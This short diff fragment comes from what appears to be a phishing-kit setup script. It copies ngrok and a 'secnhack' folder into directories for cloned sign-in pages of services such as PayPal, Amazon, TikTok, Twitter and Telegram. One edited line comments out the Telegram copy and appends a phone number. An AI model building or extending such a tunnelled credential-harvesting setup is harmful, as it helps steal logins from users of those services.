@@ -50,7 +50,7 @@ cp -R ngrok secnhack sites/amazonsign/
 cp -R ngrok secnhack sites/tiktok/
 cp -R ngrok secnhack sites/phonepay/
 cp -R ngrok secnhack sites/paypal/
-cp -R ngrok secnhack sites/telegram/
+    #cp -R ngrok secnhack sites/telegram/+84937956627/
 cp -R ngrok secnhack sites/twitter/
 cp -R ngrok secnhack sites/flipcart/
 cp -R ngrok secnhack sites/wordpress/
